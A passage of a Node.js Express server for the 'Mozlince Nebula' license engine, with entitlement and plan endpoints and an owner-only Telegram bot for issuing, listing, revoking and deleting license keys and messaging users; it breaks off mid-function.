app.get('/v1/dashboard',dashboardHandler); app.get('/api/v1/dashboard',dashboardHandler);

function entitlementHandler(req,res){
  const auth = validateAnyAuth(req);
  if (!auth.ok) return res.status(401).json({ok:false,error:'missing_auth'});
  
  // CORREÇÃO: Respeitar o tier real do token (free continua free)
  const isPremium = auth.decoded.tier === 'premium' && auth.decoded.isPremium === true;
  const ent = buildEntitlement(
    isPremium ? { ativa:true, plano:'premium', lifetime:true, expiraEm: Date.now()+9999999, criadaEm: Date.now() } : null, 
    auth.decoded.sub, 
    1
  );
  
  res.json({ 
    ok:true, 
    source: isPremium ? 'premium' : 'free', 
    sourceType:'server', 
    isFounder:false, 
    tier: isPremium ? 'premium' : 'free', 
    kind: isPremium ? 'premium' : 'free', 
    active: isPremium, 
    isPremium: isPremium, 
    isVerified: isPremium, 
    installId: auth.decoded.sub, 
    plan: ent.plan, 
    planDisplayName: ent.planDisplayName, 
    lifetime: auth.decoded.lifetime === true, 
    licenseKey: auth.decoded.licenseKey, 
    issuedAt: auth.decoded.issuedAt, 
    expiresAt: auth.decoded.expiresAt, 
    scope: isPremium ? PREMIUM_SCOPE : ['free'], 
    features: isPremium ? mapFeatures(true) : mapFeatures(false), 
    capabilities: isPremium ? mapCapabilities(true) : mapCapabilities(false), 
    limits: isPremium ? { ...PREMIUM_LIMITS } : { ...FREE_LIMITS }, 
    exp: auth.decoded.exp * 1000, 
    serverTime: Date.now() 
  });
}
app.get('/v1/entitlement',entitlementHandler); app.get('/api/v1/entitlement',entitlementHandler);

/* ═══ PREMIUM DEFINITIONS · PLANOS · MISC ═══ */
const PREMIUM_FEATURES_DEF = { browser_mods:{enabled:true,label:'Browser Mods'}, rule_ops_lab:{enabled:true,label:'Rule Ops Lab'}, live_injection_hud:{enabled:true,label:'Live Injection HUD'}, algo_v2:{enabled:true,label:'Algo V2'}, exclusive_rules:{enabled:true,label:'Exclusive Rules'}, advanced_automation:{enabled:true,label:'Advanced Automation'}, multi_account:{enabled:true,label:'Multi Account'}, custom_export:{enabled:true,label:'Custom Export'}, api_access:{enabled:true,label:'API Access'} };
const PREMIUM_CAPABILITIES_DEF = { priority_support:{enabled:true,label:'Priority Support'}, custom_webhooks:{enabled:true,label:'Custom Webhooks'}, cloud_sync:{enabled:true,label:'Cloud Sync'}, bulk_actions:{enabled:true,label:'Bulk Actions'}, advanced_analytics:{enabled:true,label:'Advanced Analytics'} };

function premiumDefHandler(req,res){ res.json({ ok:true, source:'premium', tier:'premium', features: PREMIUM_FEATURES_DEF, capabilities: PREMIUM_CAPABILITIES_DEF, premiumLimits: PREMIUM_LIMITS, freeLimits: FREE_LIMITS, scope: PREMIUM_SCOPE, version:'8.4.2' }); }
app.get('/v1/premium/definitions',premiumDefHandler); app.get('/api/v1/premium/definitions',premiumDefHandler);

function planosHandler(req,res){ res.json({ ok:true, currency:'USD', planos: Object.entries(PACOTES).map(([id,p])=>({ id, nome:p.nome, dias:p.dias, lifetime:p.lifetime, preco:p.preco, preco_fmt:precoFmt(p.preco), emoji:p.emoji })) }); }
app.get('/v1/planos',planosHandler); app.get('/api/v1/planos',planosHandler);

function manifestCheckHandler(req,res){ res.json({ ok:true, latest:'1.8.0', minVersion:'1.0.0', channel: req.query.channel || 'stable', serverTime:Date.now() }); }
app.get('/v1/manifest/check',manifestCheckHandler); app.get('/api/v1/manifest',manifestCheckHandler);

function packsHandler(req,res){ const id = req.params.id; res.json({ ok:true, pack:{ id, version:'1.0.0', data:null, signature: crypto.randomBytes(32).toString('hex') }, serverTime:Date.now() }); }
app.get('/v1/packs/:id',packsHandler); app.get('/api/v1/packs/:id',packsHandler);

function telemetryHandler(req,res){ res.json({ ok:true, received:true, serverTime:Date.now() }); }
app.post('/v1/telemetry',telemetryHandler); app.post('/api/v1/telemetry',telemetryHandler);

/* ═══ SUPPORT (COM ESCAPE HTML) ═══ */
function escapeHtml(str) {
  return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}
function supportHandler(req,res){ 
  const {chatId,message} = req.body||{}; 
  if (!message) return res.status(400).json({ok:false,error:'missing_message'}); 
  if (chatId) {
    const safeMsg = escapeHtml(message);
    const safeId = escapeHtml(chatId);
    tgSend(OWNER_ID, `<b>✆ SUPORTE (API)</b>\n<code>${safeId}</code>\n\n${safeMsg}`).catch(()=>{});
  }
  res.json({ ok:true, received:true, serverTime:Date.now() }); 
}
app.post('/v1/support',supportHandler); app.post('/api/v1/support',supportHandler);

// --- FIM DA PARTE 2 ---
/* ═══════════════════════════════════════════════
   ◈ TELEGRAM BOT (Mantido e Ajustado)
   ═══════════════════════════════════════════════ */
const SUPPORT_SESSIONS = new Map();
const DM_SESSIONS = new Map();
const USER_LANG = new Map();
setInterval(() => {
  const now = Date.now();
  for (const [k,v] of SUPPORT_SESSIONS.entries()) if (now - v.ts > 10*60*1000) SUPPORT_SESSIONS.delete(k);
  for (const [k,v] of DM_SESSIONS.entries()) if (now - v.ts > 10*60*1000) DM_SESSIONS.delete(k);
}, 60000);
const TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
async function tgSend(chatId, text, keyboard=null) { try { const body={chat_id:chatId,text,parse_mode:'HTML',disable_web_page_preview:true}; if(keyboard)body.reply_markup=keyboard; const r = await fetch(`${TG_API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); const d = await r.json(); return d.ok === true; } catch(e){ log('TG','send erro: '+e.message); return false; } }
async function tgEdit(chatId, messageId, text, keyboard=null) { try { const body={chat_id:chatId,message_id:messageId,text,parse_mode:'HTML',disable_web_page_preview:true}; if(keyboard)body.reply_markup=keyboard; await fetch(`${TG_API}/editMessageText`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); } catch(e){ log('TG','edit erro: '+e.message); } }
async function tgAnswer(id, text='') { try { await fetch(`${TG_API}/answerCallbackQuery`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({callback_query_id:id,text})}); } catch {} }

const USER_DB_KEY = 'ASHEO-USER-REGISTRY';
const CONV_PREFIX = 'ASHEO-CONV-';
async function registrarUsuario(from, chatId) {
  try {
    const reg = (await redisGetRaw(USER_DB_KEY)) || {};
    const id = String(chatId);
    reg[id] = { chatId: id, nome: `${from.first_name||''} ${from.last_name||''}`.trim() || 'Sem nome', username: from.username ? '@'+from.username : null, lang: USER_LANG.get(id) || 'pt', lastSeen: Date.now() };
    await redisSetRaw(USER_DB_KEY, JSON.stringify(reg));
  } catch (e) { log('DBG', 'registrarUsuario: ' + e.message); }
}
async function buscarUsuario(termo) {
  const reg = (await redisGetRaw(USER_DB_KEY)) || {};
  const raw = String(termo || '').trim();
  if (!raw) return null;
  if (reg[raw]) return reg[raw];
  const tt = raw.toLowerCase().replace(/^@/, '');
  for (const id in reg) {
    const u = reg[id];
    if (u.username && u.username.toLowerCase().replace('@','') === tt) return u;
    if (u.nome && u.nome.toLowerCase() === tt) return u;
  }
  return null;
}
async function listarUsuarios() { const reg = (await redisGetRaw(USER_DB_KEY)) || {}; return Object.values(reg).sort((a,b) => (b.lastSeen||0) - (a.lastSeen||0)); }
async function salvarConversa(chatId, direcao, texto) {
  try {
    const k = CONV_PREFIX + String(chatId);
    const arr = (await redisGetRaw(k)) || [];
    arr.push({ dir: direcao, txt: texto, ts: Date.now() });
    if (arr.length > 200) arr.splice(0, arr.length - 200);
    await redisSetRaw(k, JSON.stringify(arr));
  } catch (e) { log('DBG','salvarConversa: '+e.message); }
}
async function lerConversa(chatId) { try { return (await redisGetRaw(CONV_PREFIX + String(chatId))) || []; } catch { return []; } }
async function limparConversa(chatId) { await redisDel(CONV_PREFIX + String(chatId)); }

const UI = {
  header: (lang='pt') => {
    const subtitle = lang === 'en' ? 'Premium License Engine' : 'Motor de Licenças Premium';
    return `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.4.2</b>\n<i>${subtitle} · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>`;
  },
  sep: '╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌',
  kv: (icon, label, value) => `<b>${icon}</b>  <b>${label}:</b>  ${value}`
};

function menuPrincipal(lang='pt') {
  const hora = new Date().toLocaleString('pt-BR', { timeZone:'America/Sao_Paulo', hour:'2-digit', minute:'2-digit' });
  return {
    texto: `${UI.header(lang)}\n\n<b>⌬  PAINEL DE CONTROLE</b>\n<code>${UI.sep}</code>\n<b>◔</b> ${hora}   <b>◉</b> online   <b>⟡</b> seguro ES256\n<code>${UI.sep}</code>\n\n<i>Selecione uma operação abaixo</i>`,
    teclado: { inline_keyboard: [
      [{ text: '⚡  Gerar Licença', callback_data:'m_gerar' }],
      [{ text: '◈  Minhas Chaves', callback_data:'m_listar' }, { text: '◧  Estatísticas', callback_data:'m_stats' }],
      [{ text: '⟡  Vincular', callback_data:'m_vincular' }, { text: '⌬  Desvincular', callback_data:'m_desvincular' }],
      [{ text: '◉  Consultar', callback_data:'m_consultar' }],
      [{ text: '✦  Tabela de Preços', callback_data:'m_precos' }],
      [{ text: '✉  Enviar Mensagem', callback_data:'m_dm' }, { text: '💬  Conversas', callback_data:'m_convs' }],
      [{ text: '✆  Suporte', callback_data:'m_contacto' }],
      [{ text: '◐  Idioma / Language', callback_data:'m_lang' }],
      [{ text: '?  Ajuda', callback_data:'m_ajuda' }, { text: '⚠  Zona de Perigo', callback_data:'m_perigo' }]
    ]}
  };
}
async function cmdStart(chatId, msgId=null) { const lang = USER_LANG.get(String(chatId)) || 'pt'; const m = menuPrincipal(lang); if (msgId) await tgEdit(chatId, msgId, m.texto, m.teclado); else await tgSend(chatId, m.texto, m.teclado); }

async function handleCallback(cb) {
  const chatId = cb.message.chat.id, msgId = cb.message.message_id, data = cb.data, userId = String(cb.from.id);
  const isOwner = userId === String(OWNER_ID);
  const lang = USER_LANG.get(String(chatId)) || 'pt';
  if (data === 'm_lang') { await tgAnswer(cb.id); await tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>◐  Escolha seu idioma / Choose your language:</b>\n<code>${UI.sep}</code>`, { inline_keyboard: [[{ text:'▸ Português (BR)', callback_data:'lang_pt' }, { text:'▸ English (US)', callback_data:'lang_en' }],[{ text: '‹  Voltar', callback_data:'m_home' }]] }); return; }
  if (data === 'lang_pt' || data === 'lang_en') { const novo = data === 'lang_pt' ? 'pt' : 'en'; USER_LANG.set(String(chatId), novo); await tgAnswer(cb.id, '✓ Idioma atualizado'); const m = menuPrincipal(novo); await tgEdit(chatId, msgId, m.texto, m.teclado); return; }
  if (!isOwner) {
    if (data === 'm_contacto') { SUPPORT_SESSIONS.set(String(chatId), { step:'waiting', ts: Date.now() }); await tgAnswer(cb.id, '✎'); await tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>✆  Suporte</b>\n<code>${UI.sep}</code>\n\n<b>✎</b> Escreva sua mensagem agora:\n<i>(o próximo texto será encaminhado ao suporte)</i>\n\n<code>${UI.sep}</code>\n<b>◔</b> Sessão expira em 10 minutos`, { inline_keyboard: [[{ text: '✕  Cancelar', callback_data:'m_cancelar_suporte' }]] }); return; }
    if (data === 'm_cancelar_suporte') { SUPPORT_SESSIONS.delete(String(chatId)); await tgAnswer(cb.id, '✕'); await tgEdit(chatId, msgId, `<b>✕  Suporte cancelado</b>`, { inline_keyboard: [[{ text: '✆  CONTACTAR SUPORTE', callback_data:'m_contacto' }]] }); return; }
    if (data === 'm_home') { await tgAnswer(cb.id); await tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>◈  Bem-vindo ao Mozlince Nebula</b>\n<code>${UI.sep}</code>\n\n<i>Para adquirir uma licença premium, clique abaixo:</i>`, { inline_keyboard: [[{ text: '✆  CONTACTAR SUPORTE', callback_data:'m_contacto' }],[{ text: '◐  Idioma / Language', callback_data:'m_lang' }]] }); return; }
    await tgAnswer(cb.id, '⛔'); return;
  }
  try {
    if (data === 'm_home') { await tgAnswer(cb.id); return cmdStart(chatId, msgId); }
    if (data === 'm_dm') {
      await tgAnswer(cb.id, '✉');
      const users = await listarUsuarios();
      if (users.length === 0) return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>✉  ENVIAR MENSAGEM</b>\n<code>${UI.sep}</code>\n<i>Nenhum usuário registrado ainda.</i>`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:'m_home' }]] });
      const kb = { inline_keyboard: [] };
      for (const u of users.slice(0, 20)) kb.inline_keyboard.push([{ text: '✉ ' + ((u.username || u.nome) + ' · ' + u.chatId).substring(0, 45), callback_data: `dm_${u.chatId}` }]);
      kb.inline_keyboard.push([{ text: '‹  Voltar', callback_data:'m_home' }]);
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>◈  USUÁRIOS CONHECIDOS</b>  <code>(${users.length})</code>\n<code>${UI.sep}</code>`, kb);
    }
    if (data.startsWith('dm_')) {
      const target = data.substring(3);
      await tgAnswer(cb.id, '✉');
      DM_SESSIONS.set(String(chatId), { step: 'await_msg', target, ts: Date.now() });
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>✉  ENVIAR MENSAGEM</b>\n<code>${UI.sep}</code>\n\n<b>✎</b>  Envie agora a mensagem para <code>${target}</code>\n<i>(o próximo texto será enviado)</i>`, { inline_keyboard: [[{ text: '✕  Cancelar', callback_data:'m_dm_cancel' }]] });
    }
    if (data === 'm_dm_cancel') { DM_SESSIONS.delete(String(chatId)); await tgAnswer(cb.id, '✕'); return cmdStart(chatId, msgId); }
    if (data === 'm_convs') {
      await tgAnswer(cb.id, '💬');
      const users = await listarUsuarios();
      if (users.length === 0) return tgEdit(chatId, msgId, `<i>Nenhum usuário registrado ainda.</i>`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:'m_home' }]] });
      const kb = { inline_keyboard: [] };
      for (const u of users.slice(0, 20)) kb.inline_keyboard.push([{ text: `💬 ${u.username || u.nome}`, callback_data: `cv_${u.chatId}` }]);
      kb.inline_keyboard.push([{ text: '‹  Voltar', callback_data:'m_home' }]);
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>💬  Conversas</b>\n<code>${UI.sep}</code>`, kb);
    }
    if (data.startsWith('cv_')) {
      const target = data.substring(3);
      await tgAnswer(cb.id);
      const hist = await lerConversa(target);
      let txt = `${UI.header(lang)}\n\n<b>💬  CONVERSA</b> <code>${target}</code>\n<code>${UI.sep}</code>\n\n`;
      if (hist.length === 0) txt += `<i>Sem histórico com este usuário.</i>`;
      else for (const m of hist.slice(-15)) { const hora = new Date(m.ts).toLocaleString('pt-BR', { timeZone:'America/Sao_Paulo', hour:'2-digit', minute:'2-digit' }); txt += `${m.dir === 'in' ? '👤' : '👑'} <i>${hora}</i>\n${m.txt.substring(0,300)}\n\n`; }
      return tgEdit(chatId, msgId, txt, { inline_keyboard: [[{ text: '✉ Enviar Mensagem', callback_data: `dm_${target}` }],[{ text: '🗑 Limpar', callback_data: `cvc_${target}` }],[{ text: '‹  Voltar', callback_data:'m_convs' }]] });
    }
    if (data.startsWith('cvc_')) { const target = data.substring(4); await limparConversa(target); await tgAnswer(cb.id, '✓ Histórico limpo'); return tgEdit(chatId, msgId, `✓ Histórico limpo`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:'m_convs' }]] }); }
    if (data === 'm_gerar') {
      await tgAnswer(cb.id, '⚡');
      const kb = { inline_keyboard: [] };
      const entries = Object.entries(PACOTES);
      for (let i = 0; i < entries.length; i += 2) {
        const linha = [{ text: `${entries[i][1].emoji} ${entries[i][1].nome} · ${precoFmt(entries[i][1].preco)}`, callback_data:`g_${entries[i][0]}` }];
        if (entries[i+1]) linha.push({ text: `${entries[i+1][1].emoji} ${entries[i+1][1].nome} · ${precoFmt(entries[i+1][1].preco)}`, callback_data:`g_${entries[i+1][0]}` });
        kb.inline_keyboard.push(linha);
      }
      kb.inline_keyboard.push([{ text: '‹  Voltar', callback_data:'m_home' }]);
      let tabela = '';
      for (const [,p] of Object.entries(PACOTES)) { const dur = p.lifetime ? '∞' : `${p.dias}d`; tabela += `<b>${p.emoji}</b>  ${p.nome.padEnd(11)}  <code>${precoFmt(p.preco)}</code>  <i>${dur}</i>\n`; }
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>⚡  Gerar Licença</b>\n<code>${UI.sep}</code>\n<i>Escolha um plano abaixo:</i>\n\n${tabela}\n<code>${UI.sep}</code>`, kb);
    }
    if (data.startsWith('g_')) {
      const pk = data.substring(2), p = PACOTES[pk];
      if (!p) { await tgAnswer(cb.id, '✕'); return; }
      const chave = generateLicenseKey();
      const agora = Date.now();
      const expira = p.lifetime ? (agora + 100*365*24*60*60*1000) : (agora + p.dias*24*60*60*1000);
      await redisSet(chave, JSON.stringify({ chave, plano: pk, planoNome: p.nome, preco: p.preco, preco_usd: p.preco, preco_fmt: precoFmt(p.preco), dias: p.dias, lifetime: p.lifetime === true, ilimitada: p.lifetime === true, criadaEm: agora, expiraEm: expira, ativa: true, installId: null, ativadaEm: null, activationCount: 0, v: 8 }));
      log('OK', `Chave ${pk} gerada: ${chave}`);
      await tgAnswer(cb.id, '✓');
      const restaTxt = p.lifetime ? '∞  LIFETIME' : humanTime(p.dias*24*60*60*1000);
      const barra = p.lifetime ? '▰▰▰▰▰▰▰▰▰▰' : progressBar(100);
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>✓  LICENÇA EMITIDA</b>\n<code>${UI.sep}</code>\n\n<b>⌬  Chave</b>\n<code>${chave}</code>\n\n<code>${UI.sep}</code>\n${UI.kv(p.emoji, 'Plano', `<b>${p.nome}</b>`)}\n${UI.kv('◆', 'Preço', `<code>${precoFmt(p.preco)}</code>`)}\n${UI.kv('◔', 'Emitida', formatDate(agora))}\n${UI.kv('◕', 'Expira', p.lifetime ? `<b>Nunca</b>` : formatDate(expira))}\n${UI.kv('⟡', 'Duração', `<b>${restaTxt}</b>`)}\n${UI.kv('∞', 'Lifetime', p.lifetime ? `✓ Sim` : `✕ Não`)}\n<code>${UI.sep}</code>\n<code>${barra}</code>`, { inline_keyboard: [[{ text: '◉  Consultar', callback_data:`c_${chave}` }],[{ text: '‹  Menu', callback_data:'m_home' }]] });
    }
    if (data === 'm_listar') {
      await tgAnswer(cb.id, '◈');
      const keys = await redisKeys('ASHEO-*');
      if (keys.length === 0) return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>◈  Minhas Licenças</b>\n<code>${UI.sep}</code>\n<i>Nenhuma licença cadastrada.</i>`, { inline_keyboard: [[{ text: '⚡  Gerar Licença', callback_data:'m_gerar' }],[{ text: '‹  Voltar', callback_data:'m_home' }]] });
      let txt = `<b>◈  Minhas Licenças</b>  <code>(${keys.length})</code>\n<code>${UI.sep}</code>\n\n`;
      const inlineKb = [];
      for (let i = 0; i < Math.min(keys.length, 15); i++) {
        const l = await redisGet(keys[i]); if (!l) continue;
        const exp = l.lifetime ? '∞' : humanTime((l.expiraEm||0) - Date.now());
        const emoji = l.lifetime ? '∞' : (l.ativa ? '●' : '○');
        txt += `<b>${emoji}</b> ${l.installId?'⟡':'○'} <code>${keys[i]}</code>\n   <i>${l.planoNome} · ${exp}</i>\n\n`;
        inlineKb.push([{ text:`▸ ${keys[i].substring(0,18)}…`, callback_data:`c_${keys[i]}` }]);
      }
      if (keys.length > 15) txt += `<i>+${keys.length-15} ocultas</i>\n`;
      inlineKb.push([{ text: '↻  Atualizar', callback_data:'m_listar' }, { text: '‹  Voltar', callback_data:'m_home' }]);
      return tgEdit(chatId, msgId, txt, { inline_keyboard: inlineKb });
    }
    if (data === 'm_stats') {
      await tgAnswer(cb.id, '◧');
      const keys = await redisKeys('ASHEO-*');
      let ativas=0, expiradas=0, vinc=0, life=0, receita=0;
      for (const k of keys) { const l = await redisGet(k); if (!l) continue; if (l.ativa) ativas++; if (!l.lifetime && l.expiraEm < Date.now()) expiradas++; if (l.installId) vinc++; if (l.lifetime) life++; if (l.preco) receita += Number(l.preco) || 0; }
      const taxa = keys.length ? Math.round((ativas/keys.length)*100) : 0;
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>◧  Estatísticas</b>\n<code>${UI.sep}</code>\n\n${UI.kv('◈', 'Total', `<code>${keys.length}</code>`)}\n${UI.kv('●', 'Ativas', `<code>${ativas}</code>`)}\n${UI.kv('○', 'Expiradas', `<code>${expiradas}</code>`)}\n${UI.kv('⟡', 'Vinculadas', `<code>${vinc}</code>`)}\n${UI.kv('∞', 'Lifetime', `<code>${life}</code>`)}\n\n<code>${UI.sep}</code>\n${UI.kv('◆', 'Receita', `<code>${precoFmt(receita)}</code>`)}\n${UI.kv('◔', 'Taxa ativa', `<b>${taxa}%</b>`)}\n<code>${progressBar(taxa, 15)}</code>`, { inline_keyboard: [[{ text: '↻  Atualizar', callback_data:'m_stats' }, { text: '‹  Voltar', callback_data:'m_home' }]] });
    }
    if (data === 'm_vincular') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>⟡ Vincular</b>\n<code>${UI.sep}</code>\n<code>/activate &lt;installId&gt; &lt;chave&gt;</code>`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:'m_home' }]] }); }
    if (data === 'm_desvincular') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>⌬ Desvincular</b>\n<code>${UI.sep}</code>\n<code>/desvincular &lt;chave&gt;</code>`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:'m_home' }]] }); }
    if (data === 'm_consultar') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>◉ Consultar</b>\n<code>${UI.sep}</code>\n<code>/status &lt;chave&gt;</code>`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:'m_home' }]] }); }
    if (data === 'm_precos') {
      await tgAnswer(cb.id);
      let txt = `${UI.header(lang)}\n\n<b>✦  Tabela de Preços</b>\n<code>${UI.sep}</code>\n\n`;
      for (const [,p] of Object.entries(PACOTES)) { const dur = p.lifetime ? '∞' : `${p.dias} dias`; txt += `<b>${p.emoji}</b>  ${p.nome.padEnd(11)}  <code>${precoFmt(p.preco)}</code>\n      <i>${dur}</i>\n`; }
      txt += `\n<code>${UI.sep}</code>\n<i>◆ USD (Dólar Americano)</i>`;
      return tgEdit(chatId, msgId, txt, { inline_keyboard: [[{ text: '✆  Suporte', callback_data:'m_contacto' }],[{ text: '⚡  Gerar', callback_data:'m_gerar' }, { text: '‹  Voltar', callback_data:'m_home' }]] });
    }
    if (data === 'm_contacto') { await tgAnswer(cb.id, '✆'); SUPPORT_SESSIONS.set(String(chatId), { step:'waiting', ts: Date.now() }); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>✆  Suporte</b>\n<code>${UI.sep}</code>\n\n<b>✎</b> Escreva sua mensagem agora:\n<i>(o próximo texto será encaminhado ao suporte)</i>\n\n<code>${UI.sep}</code>\n<b>◔</b> Sessão expira em 10 minutos`, { inline_keyboard: [[{ text: '✕  Cancelar', callback_data:'m_cancelar_suporte' }]] }); }
    if (data === 'm_cancelar_suporte') { SUPPORT_SESSIONS.delete(String(chatId)); await tgAnswer(cb.id, '✕'); return cmdStart(chatId, msgId); }
    if (data === 'm_ajuda') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>?  Central de Ajuda</b>\n<code>${UI.sep}</code>\n\n<code>/start /gerar /listar /stats /status /activate /desvincular /revogar /deletar /deletartudo /usuarios /dm /conversa /resp /lang</code>\n\n<code>${UI.sep}</code>`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:'m_home' }]] }); }
    if (data === 'm_perigo') { await tgAnswer(cb.id, '⚠'); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>⚠  Zona de Perigo</b>\n<code>${UI.sep}</code>\n<b>⚠  Ações irreversíveis</b>`, { inline_keyboard: [[{ text: 'Deletar apenas ativas', callback_data:'danger_ativas' }],[{ text: 'Deletar TODAS as licenças', callback_data:'danger_tudo' }],[{ text: '‹  Voltar', callback_data:'m_home' }]] }); }
    if (data === 'danger_ativas') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>⚠  CONFIRMAR</b>\n<code>${UI.sep}</code>\nDeletar todas as licenças <b>ativas</b>?`, { inline_keyboard: [[{ text: '✓  Sim, confirmar', callback_data:'confirm_ativas' }],[{ text: '✕  Cancelar', callback_data:'m_perigo' }]] }); }
    if (data === 'danger_tudo') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>💣  CONFIRMAR</b>\n<code>${UI.sep}</code>\n⚠ DELETAR TODAS as licenças? Esta ação é irreversível.`, { inline_keyboard: [[{ text: '✓  Sim, confirmar', callback_data:'confirm_tudo' }],[{ text: '✕  Cancelar', callback_data:'m_perigo' }]] }); }
    if (data === 'confirm_ativas') { await tgAnswer(cb.id, '…'); const keys = await redisKeys('ASHEO-*'); let n = 0; for (const k of keys) { const l = await redisGet(k); if (l && l.ativa) { await redisDel(k); n++; } } return tgEdit(chatId, msgId, `✓  <b>${n} licenças removidas.</b>`, { inline_keyboard: [[{ text: '‹  Menu', callback_data:'m_home' }]] }); }
    if (data === 'confirm_tudo') { 
      await tgAnswer(cb.id, '💣'); 
      const keys = await redisKeys('ASHEO-*'); 
      let n = 0;
      // Correção: apagar APENAS chaves no formato de licença, preservando registry, conversas e campanhas
      for (const k of keys) { 
        if (/^ASHEO-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(k)) {
          await redisDel(k); 
          n++;
        }
      } 
      return tgEdit(chatId, msgId, `💣  <b>${n} licenças removidas.</b>`, { inline_keyboard: [[{ text: '‹  Menu', callback_data:'m_home' }]] }); 
    }
    if (data.startsWith('c_')) {
      const k = data.substring(2), l = await redisGet(k);
      if (!l) { await tgAnswer(cb.id, '✕'); return; }
      await tgAnswer(cb.id);
      const resta = l.lifetime ? '∞  Lifetime' : humanTime((l.expiraEm||0) - Date.now());
      const pct = l.lifetime ? 100 : Math.max(0, Math.min(100, Math.round(((l.expiraEm-Date.now())/(l.dias*86400000))*100)));
      const pk = PACOTES[l.plano] || { emoji:'◆' };
      const statusTxt = !l.ativa ? '○ Revogada' : (Date.now() > l.expiraEm && !l.lifetime ? '✕ Expirada' : '● Ativa');
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>◉  Detalhes da Licença</b>\n<code>${UI.sep}</code>\n<b>⌬  Chave</b>\n<code>${k}</code>\n<code>${UI.sep}</code>\n${UI.kv(pk.emoji, 'Plano', `<b>${l.planoNome}</b>`)}\n${UI.kv('◆', 'Preço', `<code>${precoFmt(l.preco)}</code>`)}\n${UI.kv('◔', 'Emitida', formatDate(l.criadaEm))}\n${UI.kv('◕', 'Expira', l.lifetime ? `<b>Nunca</b>` : formatDate(l.expiraEm))}\n${UI.kv('⟡', 'Restante', `<b>${resta}</b>`)}\n${UI.kv('∞', 'Lifetime', l.lifetime ? `✓ Sim` : `✕ Não`)}\n${UI.kv('◉', 'Status', statusTxt)}\n${UI.kv('⟡', 'Install ID', l.installId?`<code>${l.installId.substring(0,16)}…</code>`:`<i>não vinculada</i>`)}\n<code>${UI.sep}</code>\n<code>${progressBar(pct)}</code> ${pct}%`, { inline_keyboard: [[{ text: l.installId ? '⌬ Desvincular' : '⟡ Vincular', callback_data: l.installId?`dv_${k}`:`v_${k}` }],[{ text: '✕ Revogar', callback_data:`rv_${k}` }, { text: '✕ Deletar', callback_data:`dl_${k}` }],[{ text: '‹  Menu', callback_data:'m_home' }]] });
    }
    if (data.startsWith('v_')) { const k = data.substring(2); await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>⟡ Vincular</b>\n<code>/activate &lt;installId&gt; ${k}</code>`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:`c_${k}` }]] }); }
    if (data.startsWith('dv_')) { const k = data.substring(3), l = await redisGet(k); if (l) { l.installId = null; l.ativadaEm = null; await redisSet(k, JSON.stringify(l)); } await tgAnswer(cb.id, '⌬'); return tgEdit(chatId, msgId, `✓ Desvinculada`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:`c_${k}` }]] }); }
    if (data.startsWith('rv_')) { const k = data.substring(3), l = await redisGet(k); if (l) { l.ativa = false; await redisSet(k, JSON.stringify(l)); } await tgAnswer(cb.id, '✕'); return tgEdit(chatId, msgId, `✕ Revogada`, { inline_keyboard: [[{ text: '‹  Voltar', callback_data:`c_${k}` }]] }); }
    if (data.startsWith('dl_')) { const k = data.substring(3); await redisDel(k); await tgAnswer(cb.id, '✕'); return tgEdit(chatId, msgId, `✕ Deletada`, { inline_keyboard: [[{ text: '‹  Menu', callback_data:'m_home' }]] }); }
    await tgAnswer(cb.id);
  } catch (e) { log('ERRO', 'Callback: ' + e.message); try { await tgAnswer(cb.id, '✕ Erro'); } catch {} }
}

async function handleMessage(msg) {
  const chatId = msg.chat.id, userId = String(msg.from.id);
  const texto = (msg.text || '').trim();
  const args = texto.replace(/\n/g,' ').split(' ').filter(a=>a.length>0);
  const cmd = (args[0] || '').toLowerCase();
  const isOwner = userId === String(OWNER_ID);
  const lang = USER_LANG.get(String(chatId)) || 'pt';
  registrarUsuario(msg.from, chatId).catch(()=>{});
  const dmSess = DM_SESSIONS.get(String(chatId));
  if (dmSess && dmSess.step === 'await_msg' && isOwner && texto) {
    DM_SESSIONS.delete(String(chatId));
    const alvo = dmSess.target;
